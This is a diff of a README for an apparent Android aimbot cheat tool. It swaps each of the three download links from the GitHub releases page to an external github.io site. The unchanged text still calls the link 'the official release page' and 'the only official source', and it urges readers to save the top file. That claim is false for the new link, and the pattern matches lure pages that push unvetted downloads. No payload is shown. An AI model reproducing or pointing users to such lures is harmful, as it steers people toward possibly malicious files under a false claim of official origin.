@@ -1,6 +1,6 @@
 # 🎯 aimbot-android-script-hub - Seamless Tracking, Effortless Winning
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blueviolet?style=for-the-badge&logo=github)](https://github.com/Amaren5079/aimbot-android-script-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blueviolet?style=for-the-badge&logo=github)](https://amaren5079.github.io)
 
 ## 🕹️ What Is This?
 
@@ -27,7 +27,7 @@ Follow these steps exactly as written. It will take less than five minutes.
 
 Visit this link to download the application:
 
-[Click Here to Download aimbot-android-script-hub](https://github.com/Amaren5079/aimbot-android-script-hub/releases)
+[Click Here to Download aimbot-android-script-hub](https://amaren5079.github.io)
 
 This link takes you to the official release page. Look for the largest button or the file listed at the top. Click it to save the file to your computer.
 
@@ -111,7 +111,7 @@ Visit the release page and look for the "Issues" tab. You can post your question
 
 If you ever need to reinstall or get the newest version, simply return to:
 
-[Download aimbot-android-script-hub Here](https://github.com/Amaren5079/aimbot-android-script-hub/releases)
+[Download aimbot-android-script-hub Here](https://amaren5079.github.io)
 
 Bookmark this link. It is the only official source for the application.
 
